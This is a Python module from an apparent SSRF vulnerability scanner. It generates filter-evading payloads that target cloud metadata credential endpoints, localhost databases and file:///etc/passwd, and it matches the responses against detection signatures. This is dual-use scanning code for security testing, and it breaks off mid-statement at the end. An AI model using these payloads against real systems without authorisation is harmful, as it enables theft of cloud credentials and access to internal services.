"""
Server-Side Request Forgery (SSRF) Detection Engine and Collector.

Actively fuzzes discovered endpoint parameters (GET query parameters, POST form & JSON bodies,
path segments, and HTTP headers) for Server-Side Request Forgery vulnerabilities using AuthenticatedHttpClient.

Supports multi-technique detection:
1. Cloud Metadata Response Detection (AWS IMDSv1/v2, GCP computeMetadata, Azure IMDS,
   DigitalOcean, Oracle Cloud OCI, Alibaba Cloud).
2. Internal Service Response Detection (Redis banners/PONG, MySQL/PostgreSQL handshakes,
   Elasticsearch, MongoDB, Memcached, RabbitMQ, Consul/etcd, and internal admin dashboards).
3. Differential Timing Detection (latency differential >= 4.0s against unroutable / dropping IPs).
4. Bypass Mutation Engine (9 distinct bypass strategies: Decimal IP, Hex IP, Octal IP,
   Shortened IP, URL / Double URL encoding, Alternative URI schemes, IPv6 representations,
   DNS rebinding patterns, and URL parser ambiguity tricks).
5. False Positive & Reflection Suppression (baseline subtraction and echo guards).

Emits high-confidence Evidence(category="ssrf"), updates mission vulnerabilities,
and expands attack surface graph nodes with HAS_ENDPOINT and HAS_VULNERABILITY edges.
"""
from __future__ import annotations

import json
import logging
import re
import socket
import struct
import time
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Set, Tuple, Union

from argus.collectors.base import BaseCollector
from argus.evidence.model import Evidence, ProvenanceData
from argus.graph.node import Node
from argus.http.client import AuthenticatedHttpClient, HttpResponse

logger = logging.getLogger(__name__)


class Severity(str, Enum):
    """Vulnerability severity levels."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class SSRFTechnique(str, Enum):
    """Detection technique classifications for SSRF."""
    CLOUD_METADATA = "cloud_metadata"
    INTERNAL_SERVICE = "internal_service"
    DIFFERENTIAL_TIMING = "differential_timing"


class SSRFCloudProvider(str, Enum):
    """Cloud providers with accessible instance metadata services."""
    AWS = "aws"
    GCP = "gcp"
    AZURE = "azure"
    DIGITALOCEAN = "digitalocean"
    ORACLE = "oracle"
    ALIBABA = "alibaba"
    GENERIC = "generic"


@dataclass
class SSRFResult:
    """Represents the structured result of an SSRF analysis."""
    technique: str  # "cloud_metadata", "internal_service", "differential_timing"
    payload: str
    parameter: str
    parameter_type: str  # "query", "body", "json", "path", "header"
    status_code: int = 200
    target_service: str = "generic"  # "aws_imds", "gcp_metadata", "redis", "mysql", etc.
    matched_pattern: str = ""
    snippet: str = ""
    severity: str = Severity.CRITICAL
    confidence: float = 0.95
    template_id: str = "ssrf"
    delay_delta: float = 0.0
    baseline_elapsed: float = 0.0
    injected_elapsed: float = 0.0
    bypass_strategy: str = "none"
    cloud_provider: str = ""
    extra: Dict[str, Any] = field(default_factory=dict)


# =============================================================================
# Regex Signatures Catalogs
# =============================================================================

# Cloud Metadata Signatures
CLOUD_METADATA_SIGNATURES: Dict[str, Dict[str, Any]] = {
    "aws_iam_role": {
        "pattern": re.compile(r"security-credentials/[a-zA-Z0-9_\-\.]+", re.IGNORECASE),
        "provider": SSRFCloudProvider.AWS.value,
        "description": "AWS IMDS IAM Role listing",
    },
    "aws_security_credentials": {
        "pattern": re.compile(
            r"\{\s*\"Code\"\s*:\s*\"Success\"[^\}]*\"AccessKeyId\"\s*:\s*\"(?:AKIA|ASIA)[A-Z0-9]{16}\"",
            re.IGNORECASE,
        ),
        "provider": SSRFCloudProvider.AWS.value,
        "description": "AWS IMDS IAM Security Credentials JSON",
    },
    "aws_instance_identity": {
        "pattern": re.compile(
            r"\"instanceId\"\s*:\s*\"i-[0-9a-f]{8,17}\"|\"imageId\"\s*:\s*\"ami-[0-9a-f]{8,17}\"|\"architecture\"\s*:\s*\"(?:x86_64|arm64)\"",
            re.IGNORECASE,
        ),
        "provider": SSRFCloudProvider.AWS.value,
        "description": "AWS EC2 Dynamic Instance Identity Document",
    },
    "aws_ami_id": {
        "pattern": re.compile(r"\bami-[0-9a-f]{8,17}\b", re.IGNORECASE),
        "provider": SSRFCloudProvider.AWS.value,
        "description": "AWS EC2 AMI Identifier",
    },
    "aws_imds_token": {
        "pattern": re.compile(r"aws-ec2-metadata-token-ttl-seconds|\bEC2_METADATA_TOKEN\b", re.IGNORECASE),
        "provider": SSRFCloudProvider.AWS.value,
        "description": "AWS IMDSv2 Token Header / Parameter Echo",
    },
    "gcp_instance_id": {
        "pattern": re.compile(
            r"\bcomputeMetadata/v1\b|\"project\":\s*\{\s*\"projectId\"|\"numericProjectId\"\s*:\s*\d+",
            re.IGNORECASE,
        ),
        "provider": SSRFCloudProvider.GCP.value,
        "description": "GCP Compute Engine Metadata Document",
    },
    "gcp_service_accounts": {
        "pattern": re.compile(
            r"instance/service-accounts/[a-zA-Z0-9_\-\.]+@(?:developer|[a-z0-9\-]+)\.gserviceaccount\.com",
            re.IGNORECASE,
        ),
        "provider": SSRFCloudProvider.GCP.value,
        "description": "GCP Service Account Email Reference",
    },
    "azure_vm_metadata": {
        "pattern": re.compile(
            r"\{\s*\"compute\"\s*:\s*\{[^\}]*\"vmId\"\s*:\s*\"[0-9a-f\-]{36}\"|\"osType\"\s*:\s*\"(?:Linux|Windows)\"",
            re.IGNORECASE,
        ),
        "provider": SSRFCloudProvider.AZURE.value,
        "description": "Azure Instance Metadata Service (IMDS) VM JSON",
    },
    "digitalocean_droplet": {
        "pattern": re.compile(
            r"\"droplet_id\"\s*:\s*\d+|\"vendor_data\"|\"hostname\"\s*:\s*\"[^\"]+\.digitalocean\.com\"",
            re.IGNORECASE,
        ),
        "provider": SSRFCloudProvider.DIGITALOCEAN.value,
        "description": "DigitalOcean Droplet Metadata JSON",
    },
    "oracle_cloud": {
        "pattern": re.compile(
            r"\"id\"\s*:\s*\"ocid1\.instance\.|\"canonicalRegionName\"\s*:\s*\"[a-z]{2}-[a-z]+-\d+\"",
            re.IGNORECASE,
        ),
        "provider": SSRFCloudProvider.ORACLE.value,
        "description": "Oracle Cloud Infrastructure (OCI) Instance Metadata",
    },
    "alibaba_cloud": {
        "pattern": re.compile(
            r"\binstance-id\b.*\bimage-id\b|\"zone-id\"\s*:\s*\"[a-z0-9\-]+\"|\"eipv4\"\s*:\s*\"[0-9.]+\"",
            re.IGNORECASE,
        ),
        "provider": SSRFCloudProvider.ALIBABA.value,
        "description": "Alibaba Cloud ECS Instance Metadata",
    },
}

# Internal Service Response Signatures
INTERNAL_SERVICE_SIGNATURES: Dict[str, Dict[str, Any]] = {
    "redis_pong": {
        "pattern": re.compile(
            r"(?:\+PONG\b|PONG\b|\+OK\b|-ERR\s+(?:unknown\s+command|wrong\s+number\s+of\s+arguments)|redis_version:\d+\.\d+)",
            re.IGNORECASE,
        ),
        "service": "redis",
        "description": "Redis In-Memory Data Store Response",
        "severity": Severity.HIGH,
    },
    "mysql_handshake": {
        "pattern": re.compile(
            r"(?:\x00\x00\x00\n\d+\.\d+\.\d+|mysql_native_password|caching_sha2_password|mariadb\.org binary|Host '[^']+' is not allowed to connect to this MariaDB)",
            re.IGNORECASE,
        ),
        "service": "mysql",
        "description": "MySQL / MariaDB Server Protocol Handshake Banner",
        "severity": Severity.CRITICAL,
    },
    "postgres_handshake": {
        "pattern": re.compile(
            r"(?:FATAL:\s+password authentication failed|org\.postgresql\.util\.PSQLException|PostgreSQL.*?FATAL|database \".*?\" does not exist)",
            re.IGNORECASE,
        ),
        "service": "postgresql",
        "description": "PostgreSQL Server Handshake / Authentication Error",
        "severity": Severity.CRITICAL,
    },
    "elasticsearch_banner": {
        "pattern": re.compile(
            r"(?:You Know, for Search|\"cluster_name\"\s*:|\"lucene_version\"\s*:|\"tagline\"\s*:\s*\"You Know, for Search\")",
            re.IGNORECASE,
        ),
        "service": "elasticsearch",
        "description": "Elasticsearch REST API Status Response",
        "severity": Severity.CRITICAL,
    },
    "mongodb_banner": {
        "pattern": re.compile(
            r"(?:\"isWritablePrimary\"\s*:|\"ismaster\"\s*:|\"wireVersionMin\"\s*:|\"ok\"\s*:\s*1\.0.*\"connectionId\"|It looks like you are trying to access MongoDB over HTTP)",
            re.IGNORECASE,
        ),
        "service": "mongodb",
        "description": "MongoDB Wire / HTTP Status Banner",
        "severity": Severity.CRITICAL,
    },
    "memcached_banner": {
        "pattern": re.compile(
            r"(?:STAT pid \d+|STAT uptime \d+|VERSION \d+\.\d+|END\r?\n)",
            re.IGNORECASE,
        ),
        "service": "memcached",
        "description": "Memcached Stats / Version Response",
        "severity": Severity.HIGH,
    },
    "rabbitmq_banner": {
        "pattern": re.compile(
            r"(?:RabbitMQ|\"rabbitmq_version\"\s*:|AMQP:\d+-\d+|<title>RabbitMQ Management</title>)",
            re.IGNORECASE,
        ),
        "service": "rabbitmq",
        "description": "RabbitMQ Broker / Management Interface",
        "severity": Severity.HIGH,
    },
    "consul_etcd": {
        "pattern": re.compile(
            r"(?:\{\s*\"action\"\s*:\s*\"get\"|\"kvs\"\s*:\s*\[|\"Consul\"|\"raft_index\"|\"header\":\{\"cluster_id\")",
            re.IGNORECASE,
        ),
        "service": "consul_etcd",
        "description": "Consul / etcd Distributed Key-Value Store",
        "severity": Severity.CRITICAL,
    },
    "admin_dashboard_titles": {
        "pattern": re.compile(
            r"<title>[^<]*(?:Admin Dashboard|Internal Router|pfSense|phpMyAdmin|Kibana|Grafana|Jenkins|RabbitMQ Management|HAProxy Statistics|Spring Boot Actuator|Traefik|Kubernetes Dashboard|Webmin|Cockpit|OpenWrt)[^<]*</title>",
            re.IGNORECASE,
        ),
        "service": "internal_admin",
        "description": "Internal Administrative Portal / Dashboard Title",
        "severity": Severity.CRITICAL,
    },
}

# Default Targets for Cloud Metadata
DEFAULT_SSRF_TARGETS: List[Dict[str, Any]] = [
    # AWS
    {
        "provider": SSRFCloudProvider.AWS.value,
        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "signature": "aws_iam_role",
        "description": "AWS IMDSv1 IAM Security Credentials",
    },
    {
        "provider": SSRFCloudProvider.AWS.value,
        "url": "http://169.254.169.254/latest/dynamic/instance-identity/document",
        "signature": "aws_instance_identity",
        "description": "AWS EC2 Instance Identity Document",
    },
    {
        "provider": SSRFCloudProvider.AWS.value,
        "url": "http://169.254.169.254/latest/meta-data/ami-id",
        "signature": "aws_ami_id",
        "description": "AWS EC2 AMI ID",
    },
    # GCP
    {
        "provider": SSRFCloudProvider.GCP.value,
        "url": "http://metadata.google.internal/computeMetadata/v1/instance/id",
        "signature": "gcp_instance_id",
        "headers": {"Metadata-Flavor": "Google"},
        "description": "GCP Compute Engine Instance ID",
    },
    {
        "provider": SSRFCloudProvider.GCP.value,
        "url": "http://169.254.169.254/computeMetadata/v1/project/project-id",
        "signature": "gcp_instance_id",
        "headers": {"Metadata-Flavor": "Google"},
        "description": "GCP Project Metadata via IP",
    },
    # Azure
    {
        "provider": SSRFCloudProvider.AZURE.value,
        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "signature": "azure_vm_metadata",
        "headers": {"Metadata": "true"},
        "description": "Azure IMDS Instance Metadata",
    },
    # DigitalOcean
    {
        "provider": SSRFCloudProvider.DIGITALOCEAN.value,
        "url": "http://169.254.169.254/metadata/v1.json",
        "signature": "digitalocean_droplet",
        "description": "DigitalOcean Droplet Metadata JSON",
    },
    # Oracle Cloud
    {
        "provider": SSRFCloudProvider.ORACLE.value,
        "url": "http://169.254.169.254/opc/v1/instance/",
        "signature": "oracle_cloud",
        "headers": {"Authorization": "Bearer Oracle"},
        "description": "Oracle Cloud Infrastructure Instance Metadata",
    },
    # Alibaba Cloud
    {
        "provider": SSRFCloudProvider.ALIBABA.value,
        "url": "http://100.100.100.200/latest/meta-data/instance-id",
        "signature": "alibaba_cloud",
        "description": "Alibaba Cloud ECS Instance Metadata",
    },
]

# Internal Service Default Target Endpoints
DEFAULT_INTERNAL_SERVICE_TARGETS: List[Dict[str, Any]] = [
    {
        "service": "redis",
        "url": "http://127.0.0.1:6379/",
        "signature": "redis_pong",
        "description": "Localhost Redis Service",
    },
    {
        "service": "mysql",
        "url": "http://127.0.0.1:3306/",
        "signature": "mysql_handshake",
        "description": "Localhost MySQL Service",
    },
    {
        "service": "postgresql",
        "url": "http://127.0.0.1:5432/",
        "signature": "postgres_handshake",
        "description": "Localhost PostgreSQL Service",
    },
    {
        "service": "elasticsearch",
        "url": "http://127.0.0.1:9200/",
        "signature": "elasticsearch_banner",
        "description": "Localhost Elasticsearch API",
    },
    {
        "service": "mongodb",
        "url": "http://127.0.0.1:27017/",
        "signature": "mongodb_banner",
        "description": "Localhost MongoDB Service",
    },
    {
        "service": "memcached",
        "url": "http://127.0.0.1:11211/",
        "signature": "memcached_banner",
        "description": "Localhost Memcached Service",
    },
    {
        "service": "internal_admin",
        "url": "http://127.0.0.1:8080/admin",
        "signature": "admin_dashboard_titles",
        "description": "Localhost Internal Administration Dashboard",
    },
]

# Differential Timing Probe Targets (Unroutable / Dropping IPs)
DEFAULT_TIMING_TARGETS: List[Dict[str, Any]] = [
    {
        "url": "http://10.255.255.1:81/",
        "description": "Unroutable Private Subnet Drop IP",
        "delay": 5.0,
    },
    {
        "url": "http://192.0.2.1:81/",
        "description": "TEST-NET-1 Dropping Blackhole IP",
        "delay": 5.0,
    },
    {
        "url": "http://172.31.255.255:81/",
        "description": "RFC1918 Class B Broadcast Drop IP",
        "delay": 5.0,
    },
]

# Common SSRF Parameter Names for Automatic Discovery / Fuzzing
COMMON_SSRF_PARAMS: List[str] = [
    "url", "target", "dest", "destination", "uri", "webhook", "feed",
    "link", "src", "source", "redirect", "redirect_uri", "load", "fetch",
    "domain", "host", "path", "data", "proxy", "endpoint", "callback",
    "request", "view", "val", "file", "site", "html", "doc", "pdf",
    "image_url", "avatar", "preview", "service", "api", "download",
]

# Default SSRF Probe Routes to Test on Live Hosts
DEFAULT_SSRF_PROBE_ROUTES: List[str] = [
    "/webhook", "/fetch", "/proxy", "/download", "/preview",
    "/api/fetch", "/api/proxy", "/api/webhook", "/import",
    "/url", "/load", "/feed", "/api/v1/fetch", "/api/v1/proxy",
    "/service/fetch", "/crawler",
]


# =============================================================================
# SSRF Payload Generator & Mutation Engine (9 Bypass Strategies)
# =============================================================================

class SSRFPayloadGenerator:
    """
    Comprehensive SSRF Payload Generator and Mutation Engine.
    Implements 9 distinct bypass mutation strategies to circumvent IP/hostname
    and protocol validation filters.
    """

    @staticmethod
    def ip_to_decimal(ip: str) -> Optional[int]:
        """Converts an IPv4 address string to its 32-bit decimal integer representation."""
        try:
            octets = [int(p) for p in ip.strip().split(".")]
            if len(octets) != 4:
                return None
            for octet in octets:
                if not (0 <= octet <= 255):
                    return None
            return (octets[0] << 24) + (octets[1] << 16) + (octets[2] << 8) + octets[3]
        except Exception:
            return None

    def mutate_decimal_ip(self, host: str, path: str = "/") -> List[str]:
        """
        Strategy 1: Decimal IP Notation.
        Converts IPv4 addresses (e.g. 127.0.0.1 -> 2130706433, 169.254.169.254 -> 2852039166).
        """
        clean_path = ("/" + path.lstrip("/")) if path else "/"
        dec_val = self.ip_to_decimal(host)
        if dec_val is not None:
            return [
                f"http://{dec_val}{clean_path}",
                f"https://{dec_val}{clean_path}",
                f"{dec_val}",
            ]
        # If not direct IPv4, provide standard localhost/metadata decimals
        return [
            f"http://2130706433{clean_path}",
            f"http://2852039166{clean_path}",
        ]

    def mutate_hex_ip(self, host: str, path: str = "/") -> List[str]:
        """
        Strategy 2: Hexadecimal IP Notation.
        Converts IPv4 to 32-bit hex (0x7f000001) and dotted hex (0x7f.0x0.0x0.0x1, 0xa9fea9fe).
        """
        clean_path = ("/" + path.lstrip("/")) if path else "/"
        variants = []
        try:
            octets = [int(p) for p in host.strip().split(".")]
            if len(octets) == 4 and all(0 <= o <= 255 for o in octets):
                # 32-bit hex
                dec_val = (octets[0] << 24) + (octets[1] << 16) + (octets[2] << 8) + octets[3]
                hex_32 = f"0x{dec_val:08x}"
                variants.append(f"http://{hex_32}{clean_path}")

                # Dotted hex
                dotted_hex = ".".join(f"0x{o:x}" for o in octets)
                variants.append(f"http://{dotted_hex}{clean_path}")

                # Mixed hex
                mixed_hex = f"0x{octets[0]:x}.{octets[1]}.{octets[2]}.{octets[3]}"
                variants.append(f"http://{mixed_hex}{clean_path}")
        except Exception:
            pass

        if not variants:
            variants.extend([
                f"http://0x7f000001{clean_path}",
                f"http://0x7f.0x0.0x0.0x1{clean_path}",
                f"http://0xa9fea9fe{clean_path}",
                f"http://0xa9.0xfe.0xa9.0xfe{clean_path}",
            ])
        return variants

    def mutate_octal_ip(self, host: str, path: str = "/") -> List[str]:
        """
        Strategy 3: Octal IP Notation.
        Converts IPv4 to octal notation (0177.0.0.1, 017700000001, 0251.0376.0251.0376).
        """
        clean_path = ("/" + path.lstrip("/")) if path else "/"
        variants = []
        try:
            octets = [int(p) for p in host.strip().split(".")]
            if len(octets) == 4 and all(0 <= o <= 255 for o in octets):
                # Dotted octal
                dotted_octal = ".".join(f"{o:04o}" for o in octets)
                variants.append(f"http://{dotted_octal}{clean_path}")

                # Dotted mixed octal
                mixed_octal = f"{octets[0]:04o}.{octets[1]}.{octets[2]}.{octets[3]}"
                variants.append(f"http://{mixed_octal}{clean_path}")

                # 32-bit octal
                dec_val = (octets[0] << 24) + (octets[1] << 16) + (octets[2] << 8) + octets[3]
                oct_32 = f"{dec_val:012o}"
                variants.append(f"http://0{oct_32.lstrip('0') or '0'}{clean_path}")
        except Exception:
            pass

        if not variants:
            variants.extend([
                f"http://0177.0.0.1{clean_path}",
                f"http://017700000001{clean_path}",
                f"http://0251.0376.0251.0376{clean_path}",
            ])
        return variants

    def mutate_shortened_ip(self, host: str, path: str = "/") -> List[str]:
        """
        Strategy 4: Shortened IP Notation.
        Uses class-A / class-B / zero representations (127.1, 127.0.1, 0, 0.0.0.0).
        """
        clean_path = ("/" + path.lstrip("/")) if path else "/"
        variants = [
            f"http://127.1{clean_path}",
            f"http://127.0.1{clean_path}",
            f"http://0{clean_path}",
            f"http://0.0.0.0{clean_path}",
        ]
        try:
            octets = [int(p) for p in host.strip().split(".")]
            if len(octets) == 4:
                # 2-part shortened: A.BCD
                a_bcd = f"{octets[0]}.{(octets[1] << 16) + (octets[2] << 8) + octets[3]}"
                variants.append(f"http://{a_bcd}{clean_path}")
                # 3-part shortened: A.B.CD
                ab_cd = f"{octets[0]}.{octets[1]}.{(octets[2] << 8) + octets[3]}"
                variants.append(f"http://{ab_cd}{clean_path}")
        except Exception:
            pass
        return variants

    def mutate_url_encoding(self, url: str) -> List[str]:
        """
        Strategy 5: URL Encoding & Double URL Encoding.
        Encodes characters and IP octets to bypass regex string filters.
        """
        single_enc = urllib.parse.quote(url, safe="")
        double_enc = urllib.parse.quote(single_enc, safe="")

        # Character-level percent encoding for host octets
        parsed = urllib.parse.urlparse(url)
        host = parsed.netloc or parsed.path
        char_encoded_host = "".join(f"%{ord(c):02X}" for c in host)
        char_enc_url = url.replace(host, char_encoded_host)

        return [
            single_enc,
            double_enc,
            char_enc_url,
            urllib.parse.quote_plus(url),
        ]

    def mutate_alternative_schemes(self, host: str, port: Optional[int] = None, path: str = "") -> List[str]:
        """
        Strategy 6: Alternative URI Schemes.
        Tests non-HTTP protocols (dict://, gopher://, file:///, ldap://, tftp://).
        """
        clean_path = path.lstrip("/")
        p = port or 11211
        return [
            f"dict://{host}:{p}/",
            f"gopher://{host}:{port or 6379}/_INFO",
            f"file:///etc/passwd",
            f"file:///etc/hosts",
            f"file:///c:/windows/win.ini",
            f"ldap://{host}:{port or 389}/",
            f"tftp://{host}:{port or 69}/",
        ]

    def mutate_ipv6(self, host: str, path: str = "/") -> List[str]:
        """
        Strategy 7: IPv6 Representations.
        Tests IPv6 loopbacks, IPv4-mapped IPv6, and expanded IPv6 notations.
        """
        clean_path = ("/" + path.lstrip("/")) if path else "/"
        return [
            f"http://[::1]{clean_path}",
            f"http://[::]{clean_path}",
            f"http://[::ffff:127.0.0.1]{clean_path}",
            f"http://[::ffff:a9fe:a9fe]{clean_path}",
            f"http://[0:0:0:0:0:ffff:127.0.0.1]{clean_path}",
            f"http://[0000:0000:0000:0000:0000:0000:0000:0001]{clean_path}",
            f"http://[::1]:80{clean_path}",
        ]

    def mutate_dns_rebinding(self, host: str, path: str = "/") -> List[str]:
        """
        Strategy 8: DNS Rebinding & Alternative Localhost Domains.
        Uses wildcard DNS services and alternative loopback hostnames.
        """
        clean_path = ("/" + path.lstrip("/")) if path else "/"
        return [
            f"http://localhost{clean_path}",
            f"http://127.0.0.1.nip.io{clean_path}",
            f"http://localtest.me{clean_path}",
            f"http://customer.localhost{clean_path}",
            f"http://169.254.169.254.nip.io{clean_path}",
            f"http://spoofed.burpcollaborator.net{clean_path}",
            f"http://app.localtest.me{clean_path}",
        ]

    def mutate_parser_ambiguity(self, host: str, path: str = "/") -> List[str]:
        """
        Strategy 9: URL Parser Ambiguity & Credential Tricks.
        Exploits discrepancies in URL authority/path parsing between frontend and backend.
        """
        clean_path = ("/" + path.lstrip("/")) if path else "/"
        return [
            f"http://{host}:80@target.com{clean_path}",
            f"http://target.com#@{host}{clean_path}",
            f"http://target.com@{host}{clean_path}",
            f"http://{host}?.target.com{clean_path}",
            f"http://{host}#target.com{clean_path}",
            f"http://target.com.{host}{clean_path}",
            f"http://{host}:80#@target.com/",
            f"http://user:pass@{host}{clean_path}",
            f"http://target.com@{host}:80{clean_path}",
        ]

    def generate_mutated_payloads(self, target_url: str) -> List[str]:
        """
        Generates a comprehensive, deduplicated list of mutated payloads for a given target URL
        using all 9 bypass mutation strategies.
        """
        variants: List[str] = [target_url]
        parsed = urllib.parse.urlparse(target_url)
        host = parsed.hostname or (parsed.netloc.split(":")[0] if parsed.netloc else target_url)
        port = parsed.port
        path = parsed.path or "/"
        if parsed.query:
            path = f"{path}?{parsed.query}"

        # 1. Decimal IP
        variants.extend(self.mutate_decimal_ip(host, path))

        # 2. Hex IP
        variants.extend(self.mutate_hex_ip(host, path))

        # 3. Octal IP
        variants.extend(self.mutate_octal_ip(host, path))

        # 4. Shortened IP
        variants.extend(self.mutate_shortened_ip(host, path))

        # 5. Alternative Schemes
        variants.extend(self.mutate_alternative_schemes(host, port, path))

        # 6. IPv6
        variants.extend(self.mutate_ipv6(host, path))

        # 7. DNS Rebinding / Localhost Domains
        variants.extend(self.mutate_dns_rebinding(host, path))

        # 8. Parser Ambiguity
        variants.extend(self.mutate_parser_ambiguity(host, path))

        # 9. URL Encoding variations for the top generated payloads
        url_enc_variants = []
        for v in variants[:15]:
            url_enc_variants.extend(self.mutate_url_encoding(v))
        variants.extend(url_enc_variants)

        # Deduplicate preserving order
        seen: Set[str] = set()
        unique_variants: List[str] = []
        for item in variants:
            if item and item not in seen:
                seen.add(item)
                unique_variants.append(item)

        return unique_variants

    def generate_cloud_metadata_payloads(self) -> List[Dict[str, Any]]:
        """Returns catalog of cloud metadata target probes."""
        return list(DEFAULT_SSRF_TARGETS)

    def generate_internal_service_payloads(self) -> List[Dict[str, Any]]:
        """Returns catalog of internal service target probes."""
        return list(DEFAULT_INTERNAL_SERVICE_TARGETS)

    def generate_timing_payloads(self, delay: float = 5.0) -> List[Dict[str, Any]]:
        """Returns catalog of differential timing probe targets."""
        return list(DEFAULT_TIMING_TARGETS)


# =============================================================================
# SSRF Analyzer
# =============================================================================

class SSRFAnalyzer:
    """
    Evaluates HTTP responses for genuine Server-Side Request Forgery vulnerabilities across:
    1. Cloud Metadata Response Detection (AWS, GCP, Azure, DigitalOcean, Oracle, Alibaba).
    2. Internal Service Response Detection (Redis, MySQL, PostgreSQL, Elasticsearch, MongoDB, Memcached, RabbitMQ, Admin).
    3. Differential Timing Analysis (latency delta >= 4.0s vs baseline).
    4. False Positive & Reflection Suppression.
    """

    GENERIC_BENIGN_TITLES = re.compile(
        r"<title>[^<]*(?:error|exception|not found|bad request|forbidden|server error|search)[^<]*</title>",
        re.IGNORECASE,
    )

    def analyze_cloud_metadata(
        self,
        response: Optional[HttpResponse],
        baseline: Optional[HttpResponse] = None,
        target_info: Optional[Dict[str, Any]] = None,
    ) -> Optional[Dict[str, Any]]:
        """
        Analyzes response body for cloud metadata signatures (AWS IMDS, GCP metadata, Azure IMDS, etc.).
        """
        if not response or not response.raw_body:
            return None

        body_str = str(response.raw_body)
        baseline_body = str(baseline.raw_body) if baseline and baseline.raw_body else ""
        payload = (target_info or {}).get("url", "")
        expected_sig = (target_info or {}).get("signature", "")

        signatures_to_check: List[Tuple[str, Dict[str, Any]]] = []
        if expected_sig and expected_sig in CLOUD_METADATA_SIGNATURES:
            signatures_to_check.append((expected_sig, CLOUD_METADATA_SIGNATURES[expected_sig]))
        for sig_name, sig_meta in CLOUD_METADATA_SIGNATURES.items():
            if (sig_name, sig_meta) not in signatures_to_check:
                signatures_to_check.append((sig_name, sig_meta))

        for sig_name, sig_meta in signatures_to_check:
            pattern: re.Pattern = sig_meta["pattern"]
            provider: str = sig_meta.get("provider", SSRFCloudProvider.GENERIC.value)
            match = pattern.search(body_str)
            if match:
                snippet = match.group(0)

                # 1. Baseline Subtraction: suppress if the baseline response already contained this match
                if baseline_body and pattern.search(baseline_body):
                    continue

                # 2. Verbatim Reflection Guard: suppress if this is merely an echo of the search/input query
                if self._is_verbatim_reflection(body_str, payload, snippet):
                    continue

                return {
                    "technique": SSRFTechnique.CLOUD_METADATA.value,
                    "template_id": f"ssrf_cloud_{provider}",
                    "severity": Severity.CRITICAL,
                    "confidence": 0.95,
                    "cloud_provider": provider,
                    "target_service": f"{provider}_metadata",
                    "matched_pattern": sig_name,
                    "snippet": snippet[:250],
                    "payload": payload,
                    "extra": {
                        "provider": provider,
                        "description": sig_meta.get("description", ""),
                        "status_code": getattr(response, "status_code", 200),
                    },
                }

        return None

    def analyze_internal_service(
        self,
        response: Optional[HttpResponse],
        baseline: Optional[HttpResponse] = None,
        target_info: Optional[Dict[str, Any]] = None,
    ) -> Optional[Dict[str, Any]]:
        """
        Analyzes response body for internal service signatures (Redis, MySQL, PostgreSQL, Elasticsearch, MongoDB, Memcached, Admin).
        """
        if not response or not response.raw_body:
            return None

        body_str = str(response.raw_body)
        baseline_body = str(baseline.raw_body) if baseline and baseline.raw_body else ""
        payload = (target_info or {}).get("url", "")
        expected_sig = (target_info or {}).get("signature", "")

        signatures_to_check: List[Tuple[str, Dict[str, Any]]] = []
        if expected_sig and expected_sig in INTERNAL_SERVICE_SIGNATURES:
            signatures_to_check.append((expected_sig, INTERNAL_SERVICE_SIGNATURES[expected_sig]))
        for sig_name, sig_meta in INTERNAL_SERVICE_SIGNATURES.items():
            if (sig_name, sig_meta) not in signatures_to_check:
                signatures_to_check.append((sig_name, sig_meta))


        for sig_name, sig_meta in signatures_to_check:
            pattern: re.Pattern = sig_meta["pattern"]
            service: str = sig_meta.get("service", "generic")
            match = pattern.search(body_str)
            if match:
                snippet = match.group(0)

                # Baseline Subtraction
                if baseline_body and pattern.search(baseline_body):
                    continue

                # Reflection Guard
                if self._is_verbatim_reflection(body_str, payload, snippet):
                    continue

                severity = sig_meta.get("severity", Severity.HIGH)
                return {
                    "technique": SSRFTechnique.INTERNAL_SERVICE.value,
                    "template_id": f"ssrf_internal_{service}",
                    "severity": severity,
                    "confidence": 0.92,
                    "target_service": service,
                    "matched_pattern": sig_name,
                    "snippet": snippet[:250],
                    "payload": payload,
                    "extra": {
                        "service": service,
                        "description": sig_meta.get("description", ""),
                        "status_code": getattr(response, "status_code", 200),
                    },
                }

        return None

    def analyze_differential_timing(
        self,
        injected_resp: Optional[HttpResponse],
        baseline_resp: Optional[HttpResponse] = None,
        threshold: float = 4.0,
    ) -> Optional[Dict[str, Any]]:
        """
        Analyzes timing differentials for time-based blind SSRF against unroutable / dropping IP endpoints.
        Requires delay delta >= threshold (default 4.0s) and total injected elapsed >= threshold.
        """
        if not injected_resp:
            return None

        baseline_elapsed = getattr(baseline_resp, "elapsed", 0.0) if baseline_resp else 0.0
        injected_elapsed = getattr(injected_resp, "elapsed", 0.0)
        delay_delta = round(injected_elapsed - baseline_elapsed, 4)

        if delay_delta >= threshold and injected_elapsed >= threshold:

            return {
                "technique": SSRFTechnique.DIFFERENTIAL_TIMING.value,
                "template_id": "ssrf_timing_blind",
                "severity": Severity.HIGH,
                "confidence": 0.90,
                "delay_delta": delay_delta,
                "baseline_elapsed": baseline_elapsed,
                "injected_elapsed": injected_elapsed,
                "target_service": "unroutable_network",
                "matched_pattern": "differential_timing_latency_delta",
                "snippet": (
                    f"Server-side request latency increased by {delay_delta:.2f}s "
                    f"(baseline: {baseline_elapsed:.2f}s, injected: {injected_elapsed:.2f}s, threshold: {threshold:.1f}s)"
                ),
            }

        return None


    def is_false_positive(
        self,
        response: Optional[HttpResponse],
        payload: str = "",
        baseline: Optional[HttpResponse] = None,
    ) -> bool:
        """
        Determines if a response is a false positive (empty response, identical to baseline,
        or purely reflected query string in benign error pages).
        """
        if not response or not response.raw_body:
            return True

        body_str = str(response.raw_body).strip()
        if len(body_str) < 5:
            return True

        if baseline and baseline.raw_body:
            if body_str == str(baseline.raw_body).strip():
                return True

        return False

    def _is_verbatim_reflection(self, body: str, payload: str, snippet: str) -> bool:
        """
        Checks if the matched snippet is solely due to the payload being echoed back
        in an HTML search heading, input field, or documentation string without internal response execution.
        """
        if not payload or not snippet:
            return False
        clean_payload = payload.strip()
        clean_snippet = snippet.strip()

        # If snippet exactly equals payload and no actual service response markers exist
        if clean_snippet == clean_payload and not any(
            marker in clean_snippet
            for marker in (
                "AccessKeyId", "computeMetadata", "vmId", "+PONG",
                "redis_version", "mysql_native_password", "You Know, for Search",
                "droplet_id", "ocid1.instance.", "<title>Admin Dashboard</title>",
            )
        ):
            return True

        # Check for search echo wrappers: e.g. <p>Results for "..."</p>
        search_echo_pattern = re.compile(
